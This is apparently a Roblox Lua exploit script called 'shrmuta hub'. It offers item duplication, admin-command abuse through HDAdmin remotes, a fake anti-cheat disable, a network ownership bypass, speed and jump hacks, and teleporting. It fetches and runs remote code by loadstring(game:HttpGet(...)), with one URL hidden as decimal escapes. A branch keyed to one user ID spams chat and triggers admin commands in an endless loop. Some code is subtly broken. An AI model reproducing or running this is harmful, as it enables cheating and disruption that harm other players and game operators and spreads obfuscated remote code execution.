local GUI = loadstring(game:HttpGet("https://pastebin.com/raw/meUSVUyQ"))()
local speaker = game.Players.LocalPlayer
if speaker.UserId == "2842627100" then
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Name me znobte not snobe")
    while wait() do 
        local A_1 = "اخلاط عمي اهههههههه"
        local A_2 = "All"
        local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
        Event:FireServer(A_1, A_2)
        local tgggg = {
            [1] = ";char me 00NLYZ0E "
        }
    
        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(tgggg)) wait(1)
        local Player = game.Players.LocalPlayer
    local Char = Player.Character
    for i,v in pairs(Player.Backpack:GetDescendants()) do
        if (v:IsA('Tool')) then
            v.Parent = Player.Character
        end
    end
    for i,v in pairs(Char:GetDescendants()) do
        if (v:IsA('RemoteEvent')) then
            v:FireServer('PlaySong', 7819696380)
        end
    end
    
    end
else
    print("working")
game.StarterGui:SetCore("SendNotification",{
    Title = "قبل لا تبدا";
    Text = "صلي على محمد"
})
wait(5)
game.StarterGui:SetCore("SendNotification",{
    Title = "good new's";
    Text = "Dupe is now FIXED"
})
local UI = GUI:CreateWindow("shrmuta hub","UI made by dream0_7")
_G.anticheat = true
stopDupe = true
UserInputService = game:GetService("UserInputService")
local Home = UI:addPage("Home",1,true,6)
local fescripts = UI:addPage("Fe Script's",4,false,10)
TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local radio = "\216\167\217\132\216\167\216\186\216\167\217\134\217\138 \217\133\216\179\216\172\217\132"
function Dupe(amount)
    local DropT = {}
    speaker.Character.Humanoid:UnequipTools()
    stopDupe = false
    local Pos = speaker.Character.HumanoidRootPart.CFrame
    speaker.Character:MoveTo(Vector3.new(0, 1e7, 0))
    wait(.15)
    speaker.Character.HumanoidRootPart.Anchored = true
    for i = 1, amount do
        if stopDupe then
            break
        end
        wait(0.5)
        speaker.Character:MoveTo(Vector3.new(0, 1e7, 0))
        wait(.3)
        for i, v in pairs(speaker.Backpack:GetChildren()) do
            if v:IsA("Tool") and v.Name == radio then
                v.Parent = speaker.Character
                wait(.08)
                v.Parent = workspace
                table.insert(DropT, v)
            end
        end
        wait(.3)
        print("Respawning.!")
        local args = {
            [1] = ";respawn "
        }

        repeat 
            game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args)) wait()
        print("repeating")
        until speaker.CharacterAdded:wait()
        if stopDupe then
            break
        end
    end
    wait(0.3)
    speaker.Character.Humanoid:UnequipTools()
    wait(0.3)
    for i, v in pairs(Workspace:GetChildren("\216\167\217\132\216\167\216\186\216\167\217\134\217\138 \217\133\216\179\216\172\217\132")) do
    if v:IsA("Tool") and v.Name == radio then
        firetouchinterest(v.Handle, speaker.Character.RightHand, 0)
        speaker.Character.HumanoidRootPart.CFrame = Pos
    end
    end
    grabtools()
    wait(0.5)
    ungrabtools()
wait(.3)
end    

function getRoot(char)
    local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
    return rootPart
end

function tools(plr)
    if plr:FindFirstChildOfClass("Backpack"):FindFirstChildOfClass('Tool') or plr.Character:FindFirstChildOfClass('Tool') then
        return true
    end
end

function grabtools()
    local Human = speaker.Character:FindFirstChildWhichIsA("Humanoid")
    for _, v in ipairs(workspace:GetChildren()) do
        if speaker.Character and v:IsA("BackpackItem") and v:FindFirstChild("Handle") then
            Human:EquipTool(v)
        end
    end
    if grabtoolsFunc then grabtoolsFunc:Disconnect() end
    grabtoolsFunc = workspace.ChildAdded:Connect(function(v)
        if speaker.Character and v:IsA("BackpackItem") and v:FindFirstChild("Handle") then
            speaker.Character.Humanoid:EquipTools()
        end
    end)
end
function ungrabtools()
     if grabtoolsFunc then grabtoolsFunc:Disconnect() end
end
spawn(function ()
    function dropped()
    if speaker.Character then
        for _,obj in pairs(speaker.Character:GetChildren()) do
            if obj:IsA("Tool") then
                obj.CanBeDropped = true
            end
        end
    end
    if speaker:FindFirstChildOfClass("Backpack") then
        for _,obj in pairs(speaker:FindFirstChildOfClass("Backpack"):GetChildren()) do
            if obj:IsA("Tool") then
                obj.CanBeDropped = true
            end
        end
    end
end
end)



spawn(function ()
    function AK()
        dropped()
        OrionLib:MakeNotification({
        Name = "Note:",
        Content = "Drop the Other Tools",
        Image = "rbxassetid://4483345998",
        Time = 5
    })
    local plr = game:GetService("Players").LocalPlayer; plr.Character.Humanoid:UnequipTools()
    local Tools = plr.Backpack:GetChildren()
    
    Tools[1].Grip = CFrame.new(0.7, -0.5, -0.2) * CFrame.Angles(50, math.rad(-180), 3.13)
    Tools[1].Parent = plr.Character

    Tools[2].Grip = CFrame.new(0.5, -1.2, -0.2) * CFrame.Angles(0, math.rad(-90), 0)
    Tools[2].Parent = plr.Character

    Tools[3].Grip = CFrame.new(-1.5, -1.2, -0.2) * CFrame.Angles(0, math.rad(-90), 0.03)
    Tools[3].Parent = plr.Character

    Tools[4].Grip = CFrame.new(-2.5, -1.2, -0.2) * CFrame.Angles(0, math.rad(-90), 0)
    Tools[4].Parent = plr.Character

    Tools[5].Grip = CFrame.new(-4.6, -0.4, -0.2) * CFrame.Angles(1.6, math.rad(-98), 1.6)
    Tools[5].Parent = plr.Character

    Tools[6].Grip = CFrame.new(-7, -1.2, -0.2) * CFrame.Angles(0, math.rad(-90), 0)
    Tools[6].Parent = plr.Character

    Tools[7].Grip = CFrame.new(-9.6, -1.2, -0.2) * CFrame.Angles(0, math.rad(-90), 0)
    Tools[7].Parent = plr.Character

    Tools[8].Grip = CFrame.new(-12.2, -1.2, -0.2) * CFrame.Angles(0, math.rad(-90), 0)
    Tools[8].Parent = plr.Character

    Tools[9].Grip = CFrame.new(-1.2, -3.1, -0.2) * CFrame.Angles(1.6, math.rad(-15), 1.6)
    Tools[9].Parent = plr.Character

    Tools[10].Grip = CFrame.new(-3.3, -2.7, -0.2) * CFrame.Angles(1.6, math.rad(-25), 1.6)
    Tools[10].Parent = plr.Character

    Tools[11].Grip = CFrame.new(-0.1, 1.8, -0.1) * CFrame.Angles(1.6, math.rad(65), 1.6)
    Tools[11].Parent = plr.Character

    Tools[12].Grip = CFrame.new(1.3, 2.05, -0.1) * CFrame.Angles(1.6, math.rad(90), 1.6)
    Tools[12].Parent = plr.Character

    Tools[13].Grip = CFrame.new(3.15, 2.05, -0.1) * CFrame.Angles(1.6, math.rad(90), 1.6)
    Tools[13].Parent = plr.Character

    Tools[14].Grip = CFrame.new(5.3, 2.05, -0.1) * CFrame.Angles(1.6, math.rad(90), 1.6)
    Tools[14].Parent = plr.Character

    Tools[15].Grip = CFrame.new(6.5, 4.1, -0.1) * CFrame.Angles(1.6, math.rad(110), 1.6)
    Tools[15].Parent = plr.Character

    Tools[16].Grip = CFrame.new(-14.3, -1.2, -0.2) * CFrame.Angles(0, math.rad(-90), 0)
    Tools[16].Parent = plr.Character

    Tools[17].Grip = CFrame.new(3.1, -1.2, -0.2) * CFrame.Angles(0, math.rad(-90), 0)
      Tools[17].Parent = plr.Character

    Tools[18].Grip = CFrame.new(5.2, -1.2, -0.2) * CFrame.Angles(0, math.rad(-90), 0)
    Tools[18].Parent = plr.Character

    Tools[19].Grip = CFrame.new(0.25, 6.8, -0.05) * CFrame.Angles(1.6, math.rad(-0), 1.6)
    Tools[19].Parent = plr.Character

     Tools[20].Grip = CFrame.new(3.8, -4.4, -0.27) * CFrame.Angles(1.6, math.rad(-137), 1.6)
    Tools[20].Parent = plr.Character
    end
end)

spawn(function ()
      function PICKAXE()
    dropped()
    OrionLib:MakeNotification({
        Name = "Note:",
        Content = "Drop the Other Tools",
        Image = "rbxassetid://4483345998",
        Time = 5
    })
    local plr = game:GetService("Players").LocalPlayer; plr.Character.Humanoid:UnequipTools()
    local Tools = plr.Backpack:GetChildren()

    Tools[1].Grip = CFrame.new(-0.4, 0.6, 0) * CFrame.Angles(1.6, math.rad(-180), 1.58)
    Tools[1].Parent = plr.Character

    Tools[2].Grip = CFrame.new(-2.7, 0.6, 0) * CFrame.Angles(1.6, math.rad(-180), 1.58)
    Tools[2].Parent = plr.Character

    Tools[3].Grip = CFrame.new(-4.5, 0.6, 0) * CFrame.Angles(1.6, math.rad(-180), 1.58)
    Tools[3].Parent = plr.Character

    Tools[4].Grip = CFrame.new(-6.3, 0.6, 0) * CFrame.Angles(1.6, math.rad(-180), 1.58)
    Tools[4].Parent = plr.Character

    Tools[5].Grip = CFrame.new(-0.3, 6.85, -0.4) * CFrame.Angles(38.5, math.rad(-270), 2.3)
    Tools[5].Parent = plr.Character

    Tools[6].Grip = CFrame.new(1.8, 6.85, -0.4) * CFrame.Angles(38.5, math.rad(-270), 2.3)
    Tools[6].Parent = plr.Character

    Tools[7].Grip = CFrame.new(3.3, 5.4, 0.32) * CFrame.Angles(1.6, math.rad(-320), 1.6)
    Tools[7].Parent = plr.Character

    Tools[8].Grip = CFrame.new(-2.42, 6.6, 0.32) * CFrame.Angles(1.6, math.rad(-220), 1.6)
       Tools[8].Parent = plr.Character
    end
end)

spawn(function ()
    function RPG()
    dropped()
    OrionLib:MakeNotification({
        Name = "Note:",
        Content = "Drop the Other Tools",
        Image = "rbxassetid://4483345998",
        Time = 5
    })
    local plr = game:GetService("Players").LocalPlayer; plr.Character.Humanoid:UnequipTools()
    local Tools = plr.Backpack:GetChildren()
    
    Tools[1].Grip = CFrame.new(0.7, -0.5, -0.2) * CFrame.Angles(50, math.rad(-180), 3.13)
    Tools[1].Parent = plr.Character

    Tools[2].Grip = CFrame.new(0.7, -1.2, -0.2) * CFrame.Angles(1.6, math.rad(-98),1.6)
    Tools[2].Parent = plr.Character

    Tools[3].Grip = CFrame.new(2.5, -1.2, -0.2) * CFrame.Angles(1.6, math.rad(-98),1.6)
    Tools[3].Parent = plr.Character
    
    Tools[4].Grip = CFrame.new(4.3, -1.2, -0.2) * CFrame.Angles(1.6, math.rad(-98),1.6)
    Tools[4].Parent = plr.Character

    Tools[5].Grip = CFrame.new(-6.5, -1.6, -0.2) * CFrame.Angles(1.6, math.rad(-250),1.6)
    Tools[5].Parent = plr.Character

    Tools[6].Grip = CFrame.new(6, -2.55, -0.2) * CFrame.Angles(1.6, math.rad(-115),1.6)
    Tools[6].Parent = plr.Character
    
    Tools[7].Grip = CFrame.new(1.55, 7.2, 0.1) * CFrame.Angles(1.6, math.rad(-10),1.6)
    Tools[7].Parent = plr.Character
    
    Tools[8].Grip = CFrame.new(-1.1, -1.2, -0.23) * CFrame.Angles(1.6, math.rad(-98),1.57)
    Tools[8].Parent = plr.Character

    Tools[9].Grip = CFrame.new(-2.8, -1.17, -0.17) * CFrame.Angles(1.6, math.rad(-99),1.6)
    Tools[9].Parent = plr.Character
    
    Tools[10].Grip = CFrame.new(0, 2.7, -0.2) * CFrame.Angles(1.575, math.rad(-175),1.575)
    Tools[10].Parent = plr.Character
    
    Tools[11].Grip = CFrame.new(-4.6, -1.1, -0.17) * CFrame.Angles(1.6, math.rad(-100),1.6)
    Tools[11].Parent = plr.Character
    
    Tools[12].Grip = CFrame.new(-6.3, -1.1, -0.17) * CFrame.Angles(1.6, math.rad(-100),1.6)
    Tools[12].Parent = plr.Character

    Tools[13].Grip = CFrame.new(-1, 6, -0.45) * CFrame.Angles(1.6, math.rad(-205),1.4)
    Tools[13].Parent = plr.Character
    end
end)
spawn(function ()
    function SWORD()
    dropped()
    OrionLib:MakeNotification({
        Name = "Note:",
        Content = "Drop the Other Tools",
        Image = "rbxassetid://4483345998",
        Time = 5
    })
    local plr = game:GetService("Players").LocalPlayer; plr.Character.Humanoid:UnequipTools()
    local Tools = plr.Backpack:GetChildren()

    Tools[1].Grip = CFrame.new(0, -0.3, 0) * CFrame.Angles(1.58, math.rad(-360), 1.58)
    Tools[1].Parent = plr.Character

    Tools[2].Grip = CFrame.new(0.15, 1.7, -0.02) * CFrame.Angles(1.58, math.rad(90), 1.58)
    Tools[2].Parent = plr.Character

    Tools[3].Grip = CFrame.new(3, -0.9, -0.05) * CFrame.Angles(1.58, math.rad(-45), 1.58)
    Tools[3].Parent = plr.Character

    Tools[4].Grip = CFrame.new(-3.1, -0.67, -0.049) * CFrame.Angles(1.58, math.rad(-135), 1.58)
    Tools[4].Parent = plr.Character

    Tools[5].Grip = CFrame.new(2.2, -0.3, -0.03) * CFrame.Angles(1.58, math.rad(-360), 1.58)
    Tools[5].Parent = plr.Character

    Tools[6].Grip = CFrame.new(4.2, -0.3, 0) * CFrame.Angles(1.58, math.rad(-360), 1.58)
    Tools[6].Parent = plr.Character

    Tools[7].Grip = CFrame.new(6.2, -0.3, 0) * CFrame.Angles(1.58, math.rad(-360), 1.58)
    Tools[7].Parent = plr.Character

    Tools[8].Grip = CFrame.new(8.2, -0.3, 0) * CFrame.Angles(1.58, math.rad(-360), 1.58)
    Tools[8].Parent = plr.Character

    Tools[9].Grip = CFrame.new(10.2, -0.3, 0) * CFrame.Angles(1.58, math.rad(-360), 1.58)
    Tools[9].Parent = plr.Character

    Tools[10].Grip = CFrame.new(12.2, -0.3, 0) * CFrame.Angles(1.58, math.rad(-360), 1.58)
    Tools[10].Parent = plr.Character
    end
end)

spawn(function ()
    function RAILGUNV1()
    dropped()
    OrionLib:MakeNotification({
        Name = "Note:",
        Content = "Drop the Other Tools",
        Image = "rbxassetid://4483345998",
        Time = 5
    })
    local plr = game:GetService("Players").LocalPlayer; plr.Character.Humanoid:UnequipTools()
    local Tools = plr.Backpack:GetChildren()

    Tools[1].Grip = CFrame.new(1.1, -1.2, 0) * CFrame.Angles(-1.58, math.rad(-108), -1.58)
    Tools[1].Parent = plr.Character

    Tools[2].Grip = CFrame.new(2.7, -1.2, 0.02) * CFrame.Angles(-1.58, math.rad(-108), -1.58)
     Tools[2].Parent = plr.Character

      tools[3].Grip = CFrame.new(4.5, -2.34, 0) * CFrame.Angles(-1.58, math.rad(-90), -1.58)
      Tools[3].Parent = plr.Character

    Tools[4].Grip = CFrame.new(4, 5.1, -0.07) * CFrame.Angles(-1.58, math.rad(-180), -1.58)
    Tools[4].Parent = plr.Character

    Tools[5].Grip = CFrame.new(-5.6, 0.9, -0.07) * CFrame.Angles(-1.58, math.rad(-305), -1.58)
    Tools[5].Parent = plr.Character

    Tools[6].Grip = CFrame.new(-1.29, 3.5, -0.07) * CFrame.Angles(-1.58, math.rad(-262), -1.58)
    Tools[6].Parent = plr.Character

    Tools[7].Grip = CFrame.new(4, 1, -0.07) * CFrame.Angles(-1.58, math.rad(-193), -1.58)
    Tools[7].Parent = plr.Character

    Tools[8].Grip = CFrame.new(-2.8, -0.8, 0) * CFrame.Angles(-1.58, math.rad(-25), -1.58)
    Tools[8].Parent = plr.Character
    
    Tools[9].Grip = CFrame.new(0.8, 4.8, -0.07) * CFrame.Angles(-1.58, math.rad(-270), -1.58)
    Tools[9].Parent = plr.Character

    Tools[10].Grip = CFrame.new(-2.3, -3.8, 0) * CFrame.Angles(-1.58, math.rad(-90), -1.58)
    Tools[10].Parent = plr.Character

    Tools[11].Grip = CFrame.new(-3, -3.8, 0) * CFrame.Angles(-1.58, math.rad(-90), -1.58)
    Tools[11].Parent = plr.Character

    Tools[12].Grip = CFrame.new(3, 4.8, -0.075) * CFrame.Angles(-1.58, math.rad(-270), -1.58)
    Tools[12].Parent = plr.Character
    end
end)


spawn(function ()
    function RAILGUNV2()
        dropped()
        OrionLib:MakeNotification({
            Name = "Note:",
            Content = "Drop the Other Tools",
            Image = "rbxassetid://4483345998",
            Time = 5
        })
        local plr = game:GetService("Players").LocalPlayer; plr.Character.Humanoid:UnequipTools()
        local Tools = plr.Backpack:GetChildren()
    
        Tools[1].Grip = CFrame.new(1.1, -1.2, 0) * CFrame.Angles(-1.58, math.rad(-108), -1.58)
      Tools[1].Parent = plr.Character

        Tools[2].Grip = CFrame.new(2.7, -1.2, 0.02) * CFrame.Angles(-1.58, math.rad(-108), -1.58)
      Tools[2].Parent = plr.Character

      Tools[3].Grip = CFrame.new(4.5, -2.34, 0) * CFrame.Angles(-1.58, math.rad(-90), -1.58)
      Tools[3].Parent = plr.Character

      Tools[4].Grip = CFrame.new(4, 5.1, -0.07) * CFrame.Angles(-1.58, math.rad(-180), -1.58)
      Tools[4].Parent = plr.Character

      Tools[5].Grip = CFrame.new(-5.6, 0.9, -0.07) * CFrame.Angles(-1.58, math.rad(-305), -1.58)
      Tools[5].Parent = plr.Character

      Tools[6].Grip = CFrame.new(-1.29, 3.5, -0.07) * CFrame.Angles(-1.58, math.rad(-262), -1.58)
      Tools[6].Parent = plr.Character

      Tools[7].Grip = CFrame.new(4, 1, -0.07) * CFrame.Angles(-1.58, math.rad(-193), -1.58)
      Tools[7].Parent = plr.Character

      Tools[8].Grip = CFrame.new(-2.8, -0.8, 0) * CFrame.Angles(-1.58, math.rad(-25), -1.58)
      Tools[8].Parent = plr.Character

      Tools[9].Grip = CFrame.new(0.8, 4.8, -0.07) * CFrame.Angles(-1.58, math.rad(-270), -1.58)
      Tools[9].Parent = plr.Character

      Tools[10].Grip = CFrame.new(0.6, -2.8, 0) * CFrame.Angles(-1.58, math.rad(-80), -1.58)
      Tools[10].Parent = plr.Character

      Tools[11].Grip = CFrame.new(-7.3, -2.3, 0) * CFrame.Angles(-1.58, math.rad(-45), -1.58)
      Tools[11].Parent = plr.Character

      Tools[12].Grip = CFrame.new(1.2, 3.95, -0.062) * CFrame.Angles(-1.58, math.rad(45), -1.58)
      Tools[12].Parent = plr.Character

      Tools[13].Grip = CFrame.new(4.3, 5.3, -0.075) * CFrame.Angles(-1.58, math.rad(-270), -1.58)
      Tools[13].Parent = plr.Character
    
      Tools[14].Grip = CFrame.new(-4.3, -3.5, 0) * CFrame.Angles(-1.58, math.rad(-90), -1.58)
      Tools[14].Parent = plr.Character

      Tools[15].Grip = CFrame.new(6.6, 5.3, -0.075) * CFrame.Angles(-1.58, math.rad(-270), -1.58)
      Tools[15].Parent = plr.Character

      Tools[16].Grip = CFrame.new(-6.6, -3.5, 0) * CFrame.Angles(-1.58, math.rad(-90), -1.58)
      Tools[16].Parent = plr.Character

      Tools[17].Grip = CFrame.new(8.8, 5.3, -0.075) * CFrame.Angles(-1.58, math.rad(-270), -1.58)
      Tools[17].Parent = plr.Character

      Tools[18].Grip = CFrame.new(-8.8, -3.5, 0) * CFrame.Angles(-1.58, math.rad(-90), -1.58)
      Tools[18].Parent = plr.Character

      Tools[19].Grip = CFrame.new(11, 5.3, -0.075) * CFrame.Angles(-1.58, math.rad(-270), -1.58)
        Tools[19].Parent = plr.Character

        Tools[20].Grip = CFrame.new(-11, -3.5, 0) * CFrame.Angles(-1.58, math.rad(-90), -1.58)
        Tools[20].Parent = plr.Character

        Tools[21].Grip = CFrame.new(3.7, 4.2, -0.075) * CFrame.Angles(-1.58, math.rad(-250), -1.58)
        Tools[21].Parent = plr.Character

        Tools[22].Grip = CFrame.new(-0.8, -4.1, 0) * CFrame.Angles(-1.58, math.rad(250), -1.58)
        Tools[22].Parent = plr.Character

        Tools[23].Grip = CFrame.new(-0.7, -0.2, -0.2) * CFrame.Angles(1.57, math.rad(-270), 0)
        Tools[23].Parent = plr.Character
    end
end)

spawn(function ()
    function pc()
         OrionLib:MakeNotification({
             Name = "Note:",
            Content = "Drop the Other Tools",
            Image = "rbxassetid://4483345998",
            Time = 5
        })
     local plr = game:GetService("Players").LocalPlayer; plr.Character.Humanoid:UnequipTools()
     local Tools = plr.Backpack:GetChildren()

     Tools[1].Grip = CFrame.new(0.8, 1.5, 0) * CFrame.Angles(1.575, math.rad(-180), 3.1)
     Tools[1].Parent = plr.Character

     Tools[2].Grip = CFrame.new(-0.8, -0.6, 0) * CFrame.Angles(1.575, math.rad(0), 3.1)
     Tools[2].Parent = plr.Character

     Tools[3].Grip = CFrame.new(3, 1.5, 0) * CFrame.Angles(1.575, math.rad(-180), 3.1)
     Tools[3].Parent = plr.Character

     Tools[4].Grip = CFrame.new(-3, -0.6, 0) * CFrame.Angles(1.575, math.rad(0), 3.1)
     Tools[4].Parent = plr.Character

     Tools[5].Grip = CFrame.new(5.2, 1.5, 0) * CFrame.Angles(1.575, math.rad(-180), 3.1)
     Tools[5].Parent = plr.Character

     Tools[6].Grip = CFrame.new(-5.2, -0.6, 0) * CFrame.Angles(1.575, math.rad(0), 3.1)
     Tools[6].Parent = plr.Character

     Tools[7].Grip = CFrame.new(1.1, 2.5, -2.95) * CFrame.Angles(1.575, math.rad(180), 4.68)
     Tools[7].Parent = plr.Character

     Tools[8].Grip = CFrame.new(-2.2, -3, -2.17) * CFrame.Angles(3.13, math.rad(0), 3.1)
     Tools[8].Parent = plr.Character

     Tools[9].Grip = CFrame.new(-4, -3, -2.1699) * CFrame.Angles(3.13, math.rad(0), 3.1)
     Tools[9].Parent = plr.Character

     Tools[10].Grip = CFrame.new(2.2, 3.9, -2.26) * CFrame.Angles(3.13, math.rad(0), -0.04)
     Tools[10].Parent = plr.Character

     Tools[11].Grip = CFrame.new(4, 3.9, -2.26) * CFrame.Angles(3.13, math.rad(0), -0.04)
     Tools[11].Parent = plr.Character
       end
end)

spawn(function ()
    function BOOMBOXARM()
     dropped()
     OrionLib:MakeNotification({
         Name = "Note:",
         Content = "Drop the Other Tools",
        Image = "rbxassetid://4483345998",
        Time = 5
     })
     local plr = game:GetService("Players").LocalPlayer; plr.Character.Humanoid:UnequipTools()
     local Tools = plr.Backpack:GetChildren()

     Tools[1].Grip = CFrame.new(0.6, -0.1, -0.4) * CFrame.Angles(1.58, math.rad(-90), 0)
     Tools[1].Parent = plr.Character

     Tools[2].Grip = CFrame.new(0.6, -0.1, -0.3625) * CFrame.Angles(1.58, math.rad(-90), 1.58)
     Tools[2].Parent = plr.Character

     Tools[3].Grip = CFrame.new(0.6, -0.1, -0.359) * CFrame.Angles(0, math.rad(-90), 1.58)
     Tools[3].Parent = plr.Character

     Tools[4].Grip = CFrame.new(0.6, -0.1, -0.4) * CFrame.Angles(0, math.rad(-90), -3.15)
     Tools[4].Parent = plr.Character
       end
end)

spawn(function ()
    function PHONE()
     dropped()
     OrionLib:MakeNotification({
        Name = "Note:",
        Content = "Drop the Other Tools",
        Image = "rbxassetid://4483345998",
        Time = 5
     })
     local plr = game:GetService("Players").LocalPlayer; plr.Character.Humanoid:UnequipTools()
     local Tools = plr.Backpack:GetChildren()
    
     Tools[1].Grip = CFrame.new(-1, 0.5, 0) * CFrame.Angles(0.2, math.rad(-180), 58.1)
     Tools[1].Parent = plr.Character

     Tools[2].Grip = CFrame.new(2.5, -0, 0) * CFrame.Angles(-0.2, math.rad(-180), -58.13)
     Tools[2].Parent = plr.Character

     Tools[3].Grip = CFrame.new(-2.5, 0.5, 0) * CFrame.Angles(0.2, math.rad(-180), 58.1)
     Tools[3].Parent = plr.Character

     Tools[4].Grip = CFrame.new(1, -0, 0) * CFrame.Angles(-0.2, math.rad(-180), -58.13)
     Tools[4].Parent = plr.Character

     Tools[5].Grip = CFrame.new(-4, 0.5, 0) * CFrame.Angles(0.2, math.rad(-180), 58.1)
     Tools[5].Parent = plr.Character

     Tools[6].Grip = CFrame.new(4, -0, 0) * CFrame.Angles(-0.2, math.rad(-180), -58.13)
     Tools[6].Parent = plr.Character
    end
end)

spawn(function ()
    function killv1()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/klat3mk/remake/main/fe%20kill%20for%20any%20game'))()
    end
end)


spawn(function ()
    function killv2()
     loadstring(game:HttpGet('\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\79\109\110\105\112\111\116\101\110\99\101\68\101\118\101\108\111\112\101\114\47\78\117\109\98\101\114\47\109\97\105\110\47\49\46\108\117\97'))()
     end
end)



 spawn(function ()
    function massplay(ID)
    local Player = game.Players.LocalPlayer
    local Char = Player.Character
    speaker.Character.Humanoid:UnequipTools()
    wait()
    for i,v in pairs(Player.Backpack:GetDescendants()) do
      if (v:IsA('Tool')) and v.Name == radio then
            v.Parent = Player.Character
            end
      end
        for i,v in pairs(Char:GetDescendants()) do
            if (v:IsA('RemoteEvent')) then
               v:FireServer('PlaySong', ID)
          end
      end
    end
end)   
    
local function GetHandleTools(p)
    p = p or Players.LocalPlayer
end
Home:addLabel("Welcome to my Hub ",speaker.Name )

Home:addButton("disable anticheat",function()
    if _G.anticheat == true then
    game.StarterGui:SetCore("SendNotification",{
        Title = "wait";
        Text = "displaying anti cheat";
    })
    wait(0.5)
local RunService = game:GetService("RunService")
RunService:Set3dRenderingEnabled(true)
setfpscap(4)
wait(5)
local RunService = game:GetService("RunService")
RunService:Set3dRenderingEnabled(true)
setfpscap(50)
_G.anticheat = false
wait(1)
game.StarterGui:SetCore("SendNotification",{
    Title = "Note";
    Text = "the anti cheat is disabled now";
})
elseif _G.anticheat == false then
    game.StarterGui:SetCore("SendNotification",{
        Title = "Note";
        Text = "the anti cheat is already disabled..";
    })
end
end)

Home:addTextBox("massplay","it's under a test",function(ID)
    game.StarterGui:SetCore("SendNotification",{
        Title = "note";
        Text = "playing "..ID 
    })
    massplay(ID)
end)
--[ local player ]--



local LP = UI:addPage("Local",2,false,6)

-- Label

LP:addLabel("Local","aka localplayer")

-- Slider

LP:addSlider("WalkSpeed",5,999,function(value)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = value
end)

-- slider

LP:addSlider("Jump Power / 50 is default",50,5000,function(value)
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = value
end)
local flyjump
LP:addToggle("Inf jump",function(infjump)
    if infjump == true then
        game.StarterGui:SetCore("SendNotification",{
            Title = "Toggle";
            Text = "infjump is actvie!";
    
        })
    if flyjump then flyjump:Disconnect() end
	flyjump = UserInputService.JumpRequest:Connect(function(Jump)
		Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState("Jumping")
	end)
else
    game.StarterGui:SetCore("SendNotification",{
        Title = "Toggle";
        Text = "infjump is disabled!";

    })
    if flyjump then flyjump:Disconnect() end
end
end)
-- Dropdown 

local PLIST = {}

for i,v in pairs(game:GetService("Players"):GetPlayers()) do
    table.insert(PLIST,v.DisplayName)
end
LP:addButton("Refresh Players",function()
    for i,v in pairs(game:GetService("Players"):GetPlayers()) do
        table.insert(PLIST,v.DisplayName)
    end
end)

LP:addDropdown("Teleport to Player",PLIST,4,function(value)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =  game.Players[value].Character.HumanoidRootPart.CFrame * CFrame.new(0,2,1)
end)





-- [ Fe Script's ]

fescripts:addLabel("if you crashed just reset?", "or rejoin in the misc tab" )

fescripts:addButton("Refresh low chance of crashing",function()
    game.Players.LocalPlayer.Character.Humanoid.Health = 0
    wait(0.2)
    local respawn = {
        [1] = ";Refresh me "
    }
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(respawn))
end)

fescripts:addButton("moving LONG PP",function()
    game.StarterGui:SetCore("SendNotification",{
        Title = "Note";
        Text = "made by khlat and mkrm dacca ";
    })
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Morph me DonaldTrump")
    wait(0.4)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Morph me noob1")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 3398308134")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 3409612660")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 3822880197")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 4584029953")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 3443038622")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 3656493304")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 3940375351")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 3033908130")
    wait(1.25)
    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 4154538250")
game["Run Service"].RenderStepped:connect(function()
   settings().Physics.AllowSleep = false
   setsimulationradius(math.huge*math.huge,math.huge*math.huge)
end)
 
print("Loaded Network Ownership Bypass!")
 
--[[
IronBrew:tm: obfuscation; Version 2.7.2
]]
